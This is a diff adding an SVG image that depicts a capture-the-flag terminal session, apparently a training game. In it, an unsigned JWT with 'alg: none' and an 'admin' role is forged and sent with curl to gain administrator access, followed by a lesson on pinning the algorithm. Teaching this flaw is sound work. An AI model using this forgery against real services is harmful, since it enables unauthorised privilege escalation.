@@ -1,0 +1,24 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="920" height="420" viewBox="0 0 920 420" role="img" aria-label="nullroute terminal: forging a JWT with alg none">
+<defs><linearGradient id="g" x1="0" y1="0" x2="0" y2="1"><stop offset="0" stop-color="#0d1311"/><stop offset="1" stop-color="#090d0b"/></linearGradient></defs>
+<rect x="0.5" y="0.5" width="919" height="419" rx="12" fill="url(#g)" stroke="#1d2a24"/>
+<path d="M12.5 0.5h895a12 12 0 0 1 12 12v24h-919v-24a12 12 0 0 1 12-12z" fill="#111815"/>
+<circle cx="22" cy="18" r="6" fill="#ff5f57"/><circle cx="42" cy="18" r="6" fill="#febc2e"/><circle cx="62" cy="18" r="6" fill="#28c840"/>
+<text x="460.0" y="23" text-anchor="middle" fill="#5f7a6b" font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="13">guest@tokens:~ — alg: none</text>
+<g font-family="ui-monospace,SFMono-Regular,Menlo,Consolas,monospace" font-size="14" xml:space="preserve" style="white-space:pre">
+<text x="20" y="64"><tspan fill="#39ff88">guest@tokens:~$</tspan><tspan fill="#c9f5d6"> cut -d. -f2 session.txt | base64url -d</tspan></text>
+<text x="20" y="85" fill="#c9f5d6">{&quot;sub&quot;:&quot;guest&quot;,&quot;role&quot;:&quot;user&quot;,&quot;iat&quot;:1793952000}</text>
+<text x="20" y="106"><tspan fill="#39ff88">guest@tokens:~$</tspan><tspan fill="#c9f5d6"> echo -n &#x27;{&quot;alg&quot;:&quot;none&quot;}&#x27; | base64url</tspan></text>
+<text x="20" y="127" fill="#c9f5d6">eyJhbGciOiJub25lIn0</text>
+<text x="20" y="148"><tspan fill="#39ff88">guest@tokens:~$</tspan><tspan fill="#c9f5d6"> echo -n &#x27;{&quot;sub&quot;:&quot;guest&quot;,&quot;role&quot;:&quot;admin&quot;}&#x27; | base64url</tspan></text>
+<text x="20" y="169" fill="#c9f5d6">eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG1pbiJ9</text>
+<text x="20" y="190"><tspan fill="#39ff88">guest@tokens:~$</tspan><tspan fill="#c9f5d6"> curl -H &quot;Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJndWVzdCIsInJvbGUiOiJhZG...</tspan></text>
+<text x="20" y="211" fill="#c9f5d6">{</text>
+<text x="20" y="232" fill="#c9f5d6">&#160;&#160;&quot;message&quot;: &quot;welcome, administrator&quot;,</text>
+<text x="20" y="253" fill="#c9f5d6">&#160;&#160;&quot;flag&quot;: &quot;NR{&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;}&quot;</text>
+<text x="20" y="274" fill="#c9f5d6">}</text>
+<text x="20" y="295"><tspan fill="#39ff88">guest@tokens:~$</tspan><tspan fill="#c9f5d6"> submit NR{&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;&#8226;}</tspan></text>
+<text x="20" y="316" fill="#ffd166" font-weight="700"></text>
+<text x="20" y="337" fill="#ffd166" font-weight="700">&#160;&#160;✓ FLAG ACCEPTED: tokens rooted.</text>
+<text x="20" y="358" fill="#ffd166" font-weight="700">&#160;&#160;Lesson: A JWT is just base64url JSON. Servers must pin the expected algorithm and never accept &quot;alg...</text>
+<text x="20" y="379" fill="#ffd166" font-weight="700">&#160;&#160;Next target unlocked: ssh shop</text>
+</g></svg>
